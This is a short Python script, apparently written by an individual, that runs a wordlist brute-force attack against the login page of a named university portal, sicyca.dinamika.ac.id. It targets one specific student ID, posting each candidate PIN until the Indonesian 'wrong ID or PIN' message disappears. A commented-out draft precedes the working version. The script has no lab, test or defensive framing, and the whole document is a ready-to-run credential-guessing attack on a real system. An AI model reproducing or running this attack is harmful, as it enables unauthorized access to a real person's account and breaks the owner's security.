# import requests

# url = "https://sicyca.dinamika.ac.id/?login"
# data_dict = {"nim": "21410100029" , "pin": ""}
# response = requests.post(url, data=data_dict)
# print(response.content)

# with open("D:\Python/function/passwords.txt", "r") as wordlist_file:
#     for line in wordlist_file:
#         word = line.strip()
#         data_dict["pin"] = word.encode()
        
#         if "NIM atau PIN anda Salah" not in response.content:
#             print("[+] Got the pass -->" + word )
#             exit()
# print("[+] Reached end of line")

import requests

url = "https://sicyca.dinamika.ac.id/?login"
data_dict = {"nim": "21410100029", "pin": ""}

with open("D:\Python/function\passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["pin"] = word.encode()  # Convert to bytes-like object
        print(word);
        
        response = requests.post(url, data=data_dict)
        if "NIM atau PIN anda Salah" not in response.text:  # Use response.text (str) here
            print("[+] Got the pass --> " + word)
            exit()

print("[+] Reached end of line")
